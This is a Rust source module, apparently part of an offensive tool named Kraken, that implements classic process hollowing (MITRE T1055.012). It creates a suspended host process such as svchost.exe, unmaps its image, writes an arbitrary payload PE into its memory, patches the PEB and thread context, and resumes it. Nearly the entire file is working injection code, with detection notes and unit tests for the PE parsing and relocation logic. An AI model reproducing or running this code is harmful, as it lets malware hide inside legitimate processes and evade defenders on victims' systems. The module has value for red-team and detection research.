//! Classic Process Hollowing — T1055.012
//!
//! Create a suspended target process, unmap its original image, map payload PE
//! into the same virtual address space, fix up relocations and PEB, then resume.
//!
//! Steps:
//!   1. CreateProcessW(target_exe, CREATE_SUSPENDED)
//!   2. NtQueryInformationProcess(ProcessBasicInformation) → PEB address
//!   3. ReadProcessMemory → PEB.ImageBaseAddress
//!   4. NtUnmapViewOfSection → remove original image
//!   5. Parse payload PE headers (image base, size, sections)
//!   6. NtAllocateVirtualMemory at preferred/original base, PAGE_READWRITE
//!   7. Write PE headers then each section
//!   8. Apply base relocations if load address differs from preferred base
//!   9. Update PEB.ImageBaseAddress to new load address
//!  10. SetThreadContext — point RCX (x64) or EAX (x86) at entry point
//!  11. NtResumeThread
//!
//! Detection: Sysmon Event 1 (ProcessCreate with CREATE_SUSPENDED), followed by
//! NtUnmapViewOfSection + NtAllocateVirtualMemory cross-process, then
//! SetThreadContext + ResumeThread.
//!
//! MITRE ATT&CK: T1055.012

#[cfg(windows)]
use crate::{handle::OwnedHandle, InjectionResult};
#[cfg(windows)]
use common::KrakenError;

#[cfg(windows)]
use ntapi::ntmmapi::NtAllocateVirtualMemory;
#[cfg(windows)]
use ntapi::ntmmapi::NtUnmapViewOfSection;
#[cfg(windows)]
use ntapi::ntpsapi::{NtQueryInformationProcess, NtResumeThread, ProcessBasicInformation};
#[cfg(windows)]
use ntapi::ntmmapi::NtWriteVirtualMemory;
#[cfg(windows)]
use ntapi::winapi::ctypes::c_void as nt_void;
#[cfg(windows)]
use windows_sys::Win32::Foundation::NTSTATUS;
#[cfg(windows)]
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    CreateProcessW, GetThreadContext, SetThreadContext, TerminateProcess,
    CREATE_SUSPENDED, CONTEXT, PROCESS_INFORMATION, STARTUPINFOW,
    CONTEXT_FULL,
};
#[cfg(windows)]
use windows_sys::Win32::System::Diagnostics::Debug::ReadProcessMemory;

/// Check if NTSTATUS indicates success
#[cfg(windows)]
#[inline]
fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

/// PE header parsing result
#[cfg(windows)]
struct PeInfo {
    preferred_base: usize,
    size_of_image: usize,
    entry_point_rva: usize,
    size_of_headers: usize,
    num_sections: usize,
    section_header_offset: usize,
    reloc_rva: usize,
    reloc_size: usize,
    is_64bit: bool,
}

/// Parse PE headers from payload bytes
#[cfg(windows)]
fn parse_pe(payload: &[u8]) -> Result<PeInfo, KrakenError> {
    let err = |msg: &str| KrakenError::Module(format!("PE parse: {}", msg));

    if payload.len() < 64 {
        return Err(err("payload too small for DOS header"));
    }
    if payload[0] != 0x4D || payload[1] != 0x5A {
        return Err(err("not a PE file (missing MZ magic)"));
    }

    let pe_offset = u32::from_le_bytes(
        payload[60..64].try_into().map_err(|_| err("bad e_lfanew"))?,
    ) as usize;

    if pe_offset + 24 > payload.len() {
        return Err(err("PE header offset out of bounds"));
    }
    if payload[pe_offset..pe_offset + 4] != [0x50, 0x45, 0x00, 0x00] {
        return Err(err("invalid PE signature"));
    }

    // Machine field: 0x8664 = x64, 0x014C = x86
    let machine = u16::from_le_bytes(
        payload[pe_offset + 4..pe_offset + 6].try_into().map_err(|_| err("machine field"))?,
    );
    let is_64bit = machine == 0x8664;

    let num_sections = u16::from_le_bytes(
        payload[pe_offset + 6..pe_offset + 8].try_into().map_err(|_| err("num sections"))?,
    ) as usize;

    let optional_header_size = u16::from_le_bytes(
        payload[pe_offset + 20..pe_offset + 22].try_into().map_err(|_| err("opt hdr size"))?,
    ) as usize;

    let optional_header_offset = pe_offset + 24;

    if optional_header_offset + optional_header_size > payload.len() {
        return Err(err("optional header out of bounds"));
    }

    let (preferred_base, size_of_image, entry_point_rva, size_of_headers, reloc_dir_offset) =
        if is_64bit {
            if optional_header_offset + 240 > payload.len() {
                return Err(err("PE64 optional header too small"));
            }
            let preferred_base = u64::from_le_bytes(
                payload[optional_header_offset + 24..optional_header_offset + 32]
                    .try_into()
                    .map_err(|_| err("image base"))?,
            ) as usize;
            let entry_point_rva = u32::from_le_bytes(
                payload[optional_header_offset + 16..optional_header_offset + 20]
                    .try_into()
                    .map_err(|_| err("entry point"))?,
            ) as usize;
            let size_of_image = u32::from_le_bytes(
                payload[optional_header_offset + 56..optional_header_offset + 60]
                    .try_into()
                    .map_err(|_| err("size of image"))?,
            ) as usize;
            let size_of_headers = u32::from_le_bytes(
                payload[optional_header_offset + 60..optional_header_offset + 64]
                    .try_into()
                    .map_err(|_| err("size of headers"))?,
            ) as usize;
            // Data directory 5 = Base Relocation, at optional+152 for PE64
            let reloc_dir = optional_header_offset + 152;
            (preferred_base, size_of_image, entry_point_rva, size_of_headers, reloc_dir)
        } else {
            if optional_header_offset + 224 > payload.len() {
                return Err(err("PE32 optional header too small"));
            }
            let preferred_base = u32::from_le_bytes(
                payload[optional_header_offset + 28..optional_header_offset + 32]
                    .try_into()
                    .map_err(|_| err("image base"))?,
            ) as usize;
            let entry_point_rva = u32::from_le_bytes(
                payload[optional_header_offset + 16..optional_header_offset + 20]
                    .try_into()
                    .map_err(|_| err("entry point"))?,
            ) as usize;
            let size_of_image = u32::from_le_bytes(
                payload[optional_header_offset + 56..optional_header_offset + 60]
                    .try_into()
                    .map_err(|_| err("size of image"))?,
            ) as usize;
            let size_of_headers = u32::from_le_bytes(
                payload[optional_header_offset + 60..optional_header_offset + 64]
                    .try_into()
                    .map_err(|_| err("size of headers"))?,
            ) as usize;
            // Data directory 5 = Base Relocation, at optional+136 for PE32
            let reloc_dir = optional_header_offset + 136;
            (preferred_base, size_of_image, entry_point_rva, size_of_headers, reloc_dir)
        };

    // Read relocation directory entry (RVA + Size)
    let (reloc_rva, reloc_size) = if reloc_dir_offset + 8 <= payload.len() {
        let rva = u32::from_le_bytes(
            payload[reloc_dir_offset..reloc_dir_offset + 4]
                .try_into()
                .unwrap_or([0; 4]),
        ) as usize;
        let sz = u32::from_le_bytes(
            payload[reloc_dir_offset + 4..reloc_dir_offset + 8]
                .try_into()
                .unwrap_or([0; 4]),
        ) as usize;
        (rva, sz)
    } else {
        (0, 0)
    };

    let section_header_offset = optional_header_offset + optional_header_size;

    Ok(PeInfo {
        preferred_base,
        size_of_image,
        entry_point_rva,
        size_of_headers,
        num_sections,
        section_header_offset,
        reloc_rva,
        reloc_size,
        is_64bit,
    })
}

/// Apply base relocations to PE mapped at `base` in THIS process's address space.
///
/// `payload` is the raw PE file bytes (used only for the relocation table data).
/// `load_base` is the actual virtual address the image was loaded at.
/// `preferred_base` is the preferred image base from the PE header.
#[cfg(windows)]
unsafe fn apply_relocations_local(
    base: *mut u8,
    reloc_rva: usize,
    reloc_size: usize,
    preferred_base: usize,
    load_base: usize,
) {
    if reloc_rva == 0 || reloc_size == 0 || preferred_base == load_base {
        return;
    }

    let delta = load_base as isize - preferred_base as isize;
    let mut offset = 0usize;

    while offset + 8 <= reloc_size {
        let block_ptr = base.add(reloc_rva + offset);
        let page_rva = *(block_ptr as *const u32) as usize;
        let block_size = *(block_ptr.add(4) as *const u32) as usize;

        if block_size < 8 {
            break;
        }

        let num_entries = (block_size - 8) / 2;
        for i in 0..num_entries {
            let entry_ptr = block_ptr.add(8 + i * 2);
            let entry = *(entry_ptr as *const u16);
            let reloc_type = entry >> 12;
            let reloc_off = (entry & 0x0FFF) as usize;

            let target = base.add(page_rva + reloc_off);
            match reloc_type {
                3 => {
                    // IMAGE_REL_BASED_HIGHLOW (32-bit)
                    let val = *(target as *const u32) as isize;
                    *(target as *mut u32) = (val + delta) as u32;
                }
                10 => {
                    // IMAGE_REL_BASED_DIR64 (64-bit)
                    let val = *(target as *const u64) as isize;
                    *(target as *mut u64) = (val + delta) as u64;
                }
                0 => {} // IMAGE_REL_BASED_ABSOLUTE — padding, skip
                _ => {}
            }
        }

        offset += block_size;
    }
}

/// Classic process hollowing — inject `payload` PE into `target_exe` via hollowing.
///
/// # Arguments
/// * `target_exe` - Path to the host executable (e.g. "C:\\Windows\\System32\\svchost.exe")
/// * `payload` - Raw PE bytes to inject
///
/// # Returns
/// PID of the spawned (now hollowed) process on success.
///
/// # Detection Indicators
/// - Sysmon Event 1: ProcessCreate with CREATE_SUSPENDED
/// - Sysmon Event 10: Cross-process memory access (NtAllocateVirtualMemory)
/// - NtUnmapViewOfSection on target's own image base (unusual)
/// - SetThreadContext immediately before ResumeThread
/// - EDR: hollowed process has mismatched on-disk vs. in-memory image
#[cfg(windows)]
pub fn hollow(target_exe: &str, payload: &[u8]) -> Result<u32, KrakenError> {
    let pe = parse_pe(payload)?;

    // Wide-encode target path
    let wide_path: Vec<u16> = target_exe
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    // ---- 1. CreateProcessW(target_exe, CREATE_SUSPENDED) ----
    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let ok = unsafe {
        CreateProcessW(
            wide_path.as_ptr(),
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &si,
            &mut pi,
        )
    };
    if ok == 0 {
        return Err(KrakenError::Module(format!(
            "CreateProcessW failed for '{}'",
            target_exe
        )));
    }

    let proc_handle = OwnedHandle::new(pi.hProcess)
        .ok_or_else(|| KrakenError::Module("invalid process handle".into()))?;
    let thread_handle = OwnedHandle::new(pi.hThread)
        .ok_or_else(|| KrakenError::Module("invalid thread handle".into()))?;
    let child_pid = pi.dwProcessId;

    tracing::debug!(child_pid, target_exe, "spawned suspended process for hollowing");

    // ---- 2. NtQueryInformationProcess → PROCESS_BASIC_INFORMATION ----
    // PROCESS_BASIC_INFORMATION layout (on 64-bit):
    //   [0]  ExitStatus          (NTSTATUS, 8 bytes padded)
    //   [8]  PebBaseAddress      (*PEB, pointer)
    //   [16] AffinityMask        (usize)
    //   [24] BasePriority        (KPRIORITY)
    //   [32] UniqueProcessId     (*usize)
    //   [40] InheritedFromUniqueProcessId (*usize)
    //
    // We need PebBaseAddress at offset 8 (x64) or 4 (x86).
    // ntapi's PROCESS_BASIC_INFORMATION mirrors this.

    let mut pbi: ntapi::ntpsapi::PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    let mut return_length: u32 = 0;

    let status = unsafe {
        NtQueryInformationProcess(
            proc_handle.as_raw() as *mut _,
            ProcessBasicInformation,
            &mut pbi as *mut _ as *mut nt_void,
            std::mem::size_of::<ntapi::ntpsapi::PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        )
    };
    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtQueryInformationProcess failed: 0x{:08X}",
            status
        )));
    }

    let peb_address = pbi.PebBaseAddress as usize;

    // ---- 3. Read PEB.ImageBaseAddress ----
    // PEB.ImageBaseAddress is at offset 0x10 on x64, 0x08 on x86.
    let image_base_offset: usize = if pe.is_64bit { 0x10 } else { 0x08 };
    let image_base_addr = peb_address + image_base_offset;

    let mut original_image_base: usize = 0;
    let mut bytes_read: usize = 0;

    let ok = unsafe {
        ReadProcessMemory(
            proc_handle.as_raw(),
            image_base_addr as *const _,
            &mut original_image_base as *mut usize as *mut _,
            std::mem::size_of::<usize>(),
            &mut bytes_read,
        )
    };
    if ok == 0 || bytes_read != std::mem::size_of::<usize>() {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module("ReadProcessMemory (PEB.ImageBaseAddress) failed".into()));
    }

    tracing::debug!(
        child_pid,
        peb = format!("0x{:x}", peb_address),
        original_image_base = format!("0x{:x}", original_image_base),
        "read PEB.ImageBaseAddress"
    );

    // ---- 4. NtUnmapViewOfSection — remove original image ----
    let status = unsafe {
        NtUnmapViewOfSection(
            proc_handle.as_raw() as *mut _,
            original_image_base as *mut nt_void,
        )
    };
    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtUnmapViewOfSection failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(child_pid, "unmapped original image");

    // ---- 5-6. Allocate memory for payload image ----
    // Prefer the payload's preferred base; fall back to letting the OS choose.
    let mut alloc_base = pe.preferred_base as *mut nt_void;
    let mut alloc_size = pe.size_of_image;

    let status = unsafe {
        NtAllocateVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut alloc_base as *mut *mut nt_void,
            0,
            &mut alloc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    let load_base: usize = if nt_success(status) {
        alloc_base as usize
    } else {
        // Preferred base busy — let OS choose
        alloc_base = std::ptr::null_mut();
        let status2 = unsafe {
            NtAllocateVirtualMemory(
                proc_handle.as_raw() as *mut _,
                &mut alloc_base as *mut *mut nt_void,
                0,
                &mut alloc_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if !nt_success(status2) {
            unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
            return Err(KrakenError::Module(format!(
                "NtAllocateVirtualMemory failed: 0x{:08X}",
                status2
            )));
        }
        alloc_base as usize
    };

    tracing::debug!(
        child_pid,
        load_base = format!("0x{:x}", load_base),
        size = pe.size_of_image,
        "allocated memory for payload image"
    );

    // ---- 7. Write PE headers ----
    // We build a local staging buffer, apply relocations locally, then write.
    let mut stage_buf = vec![0u8; pe.size_of_image];

    // Copy headers
    let headers_size = pe.size_of_headers.min(payload.len()).min(pe.size_of_image);
    stage_buf[..headers_size].copy_from_slice(&payload[..headers_size]);

    // Copy sections
    for i in 0..pe.num_sections {
        let sec_off = pe.section_header_offset + i * 40;
        if sec_off + 40 > payload.len() {
            break;
        }
        let virtual_address = u32::from_le_bytes(
            payload[sec_off + 12..sec_off + 16].try_into().unwrap(),
        ) as usize;
        let raw_size = u32::from_le_bytes(
            payload[sec_off + 16..sec_off + 20].try_into().unwrap(),
        ) as usize;
        let raw_ptr = u32::from_le_bytes(
            payload[sec_off + 20..sec_off + 24].try_into().unwrap(),
        ) as usize;

        if raw_size == 0 || raw_ptr + raw_size > payload.len() {
            continue;
        }
        let dst_start = virtual_address;
        let dst_end = dst_start + raw_size;
        if dst_end > stage_buf.len() {
            continue;
        }
        stage_buf[dst_start..dst_end].copy_from_slice(&payload[raw_ptr..raw_ptr + raw_size]);
    }

    // ---- 8. Apply relocations in staging buffer ----
    if load_base != pe.preferred_base && pe.reloc_rva != 0 && pe.reloc_size != 0 {
        unsafe {
            apply_relocations_local(
                stage_buf.as_mut_ptr(),
                pe.reloc_rva,
                pe.reloc_size,
                pe.preferred_base,
                load_base,
            );
        }
    }

    // Write entire staged image to target process
    let mut bytes_written: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            proc_handle.as_raw() as *mut _,
            load_base as *mut nt_void,
            stage_buf.as_ptr() as *mut nt_void,
            stage_buf.len(),
            &mut bytes_written,
        )
    };
    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtWriteVirtualMemory (image) failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(child_pid, bytes_written, "wrote payload image to target");

    // ---- 9. Update PEB.ImageBaseAddress ----
    let new_base_val = load_base;
    let mut bytes_written2: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            proc_handle.as_raw() as *mut _,
            image_base_addr as *mut nt_void,
            &new_base_val as *const usize as *mut nt_void,
            std::mem::size_of::<usize>(),
            &mut bytes_written2,
        )
    };
    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtWriteVirtualMemory (PEB update) failed: 0x{:08X}",
            status
        )));
    }

    // ---- 10. SetThreadContext — redirect entry point ----
    let entry_point = load_base + pe.entry_point_rva;

    let mut ctx: CONTEXT = unsafe { std::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_FULL;

    let ok = unsafe { GetThreadContext(thread_handle.as_raw(), &mut ctx) };
    if ok == 0 {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module("GetThreadContext failed".into()));
    }

    // On x64 the entry point is passed in RCX.
    // On x86 the entry point is in EAX.
    #[cfg(target_arch = "x86_64")]
    {
        ctx.Rcx = entry_point as u64;
    }
    #[cfg(target_arch = "x86")]
    {
        ctx.Eax = entry_point as u32;
    }

    let ok = unsafe { SetThreadContext(thread_handle.as_raw(), &ctx) };
    if ok == 0 {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module("SetThreadContext failed".into()));
    }

    // ---- 11. NtResumeThread ----
    let mut suspend_count: u32 = 0;
    let status = unsafe {
        NtResumeThread(thread_handle.as_raw() as *mut _, &mut suspend_count)
    };
    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtResumeThread failed: 0x{:08X}",
            status
        )));
    }

    tracing::info!(
        child_pid,
        entry_point = format!("0x{:x}", entry_point),
        load_base = format!("0x{:x}", load_base),
        "process hollowing complete — target resumed"
    );

    Ok(child_pid)
}

#[cfg(not(windows))]
pub fn hollow(_target: &str, _payload: &[u8]) -> Result<u32, common::KrakenError> {
    Err(common::KrakenError::Module(
        "Process hollowing only supported on Windows".into(),
    ))
}

// ── Unit tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Minimal valid PE64 stub for header parsing tests
    fn make_pe64_stub() -> Vec<u8> {
        let mut pe = vec![0u8; 0x400];
        // DOS header
        pe[0] = 0x4D; // M
        pe[1] = 0x5A; // Z
        // e_lfanew at offset 60 → PE header at 0x80
        pe[60] = 0x80;

        // PE signature at 0x80
        pe[0x80] = 0x50; // P
        pe[0x81] = 0x45; // E
        pe[0x82] = 0x00;
        pe[0x83] = 0x00;

        // Machine: 0x8664 (x64)
        pe[0x84] = 0x64;
        pe[0x85] = 0x86;

        // NumberOfSections = 1
        pe[0x86] = 1;
        pe[0x87] = 0;

        // SizeOfOptionalHeader = 240
        pe[0x94] = 240;
        pe[0x95] = 0;

        // Optional header at 0x80 + 24 = 0x98
        // Magic: 0x020B (PE64)
        pe[0x98] = 0x0B;
        pe[0x99] = 0x02;

        // AddressOfEntryPoint at optional+16 = 0x98+16 = 0xA8
        pe[0xA8] = 0x00;
        pe[0xA9] = 0x10; // RVA 0x1000

        // ImageBase at optional+24 = 0x98+24 = 0xB0
        pe[0xB0] = 0x00;
        pe[0xB1] = 0x00;
        pe[0xB2] = 0x00;
        pe[0xB3] = 0x40; // 0x0000000140000000

        // SizeOfImage at optional+56 = 0x98+56 = 0xD0
        let size: u32 = 0x3000;
        let b = size.to_le_bytes();
        pe[0xD0] = b[0];
        pe[0xD1] = b[1];
        pe[0xD2] = b[2];
        pe[0xD3] = b[3];

        // SizeOfHeaders at optional+60 = 0x98+60 = 0xD4
        pe[0xD4] = 0x00;
        pe[0xD5] = 0x02; // 0x200

        pe
    }

    #[test]
    fn test_parse_pe64_valid() {
        let stub = make_pe64_stub();
        let result = parse_pe(&stub);
        assert!(result.is_ok(), "should parse valid PE64 stub: {:?}", result.err());
        let info = result.unwrap();
        assert!(info.is_64bit);
        assert_eq!(info.entry_point_rva, 0x1000);
        assert_eq!(info.num_sections, 1);
    }

    #[test]
    fn test_parse_pe_invalid_magic() {
        let data = vec![0u8; 128];
        assert!(parse_pe(&data).is_err());
    }

    #[test]
    fn test_parse_pe_too_small() {
        assert!(parse_pe(&[0u8; 10]).is_err());
    }

    #[test]
    fn test_parse_pe_mz_but_invalid_pe() {
        let mut data = vec![0u8; 128];
        data[0] = 0x4D;
        data[1] = 0x5A;
        data[60] = 0x40; // PE header at 0x40
        // Missing PE\0\0 signature
        assert!(parse_pe(&data).is_err());
    }

    /// Verify relocation fixup works for IMAGE_REL_BASED_DIR64
    #[test]
    fn test_relocation_dir64() {
        // Build a minimal relocation block in a buffer:
        //   PageRVA = 0x1000, BlockSize = 12, one DIR64 entry at offset 0
        let mut buf = vec![0u8; 0x2000];

        // Place a relocation block at RVA 0x500
        let reloc_rva: usize = 0x500;
        let block_ptr = &mut buf[reloc_rva..];
        // PageRVA
        let page_rva: u32 = 0x1000;
        block_ptr[0..4].copy_from_slice(&page_rva.to_le_bytes());
        // BlockSize = 8 (header) + 2 (one entry) = 10, rounded: use 12
        let block_size: u32 = 10;
        block_ptr[4..8].copy_from_slice(&block_size.to_le_bytes());
        // One DIR64 entry: type=10, offset=0 → entry = (10 << 12) | 0 = 0xA000
        let entry: u16 = 0xA000;
        block_ptr[8..10].copy_from_slice(&entry.to_le_bytes());

        // Place a u64 value at page_rva + 0 = 0x1000
        let preferred_base: usize = 0x140000000;
        let original_val: u64 = preferred_base as u64 + 0xDEAD;
        buf[0x1000..0x1008].copy_from_slice(&original_val.to_le_bytes());

        let load_base: usize = 0x150000000;
        let delta = load_base as isize - preferred_base as isize;

        unsafe {
            apply_relocations_local(
                buf.as_mut_ptr(),
                reloc_rva,
                block_size as usize,
                preferred_base,
                load_base,
            );
        }

        let patched = u64::from_le_bytes(buf[0x1000..0x1008].try_into().unwrap());
        let expected = (original_val as isize + delta) as u64;
        assert_eq!(patched, expected, "DIR64 relocation not applied correctly");
    }

    /// Verify relocation is a no-op when preferred base == load base
    #[test]
    fn test_relocation_noop_same_base() {
        let mut buf = vec![0u8; 0x2000];
        let original_val: u64 = 0x140001234;
        buf[0x1000..0x1008].copy_from_slice(&original_val.to_le_bytes());

        unsafe {
            apply_relocations_local(buf.as_mut_ptr(), 0x500, 10, 0x140000000, 0x140000000);
        }

        let val = u64::from_le_bytes(buf[0x1000..0x1008].try_into().unwrap());
        assert_eq!(val, original_val, "relocation should be skipped when base unchanged");
    }

    #[cfg(not(windows))]
    #[test]
    fn test_hollow_non_windows() {
        let result = hollow("C:\\Windows\\System32\\svchost.exe", &[0u8; 0x400]);
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }
}
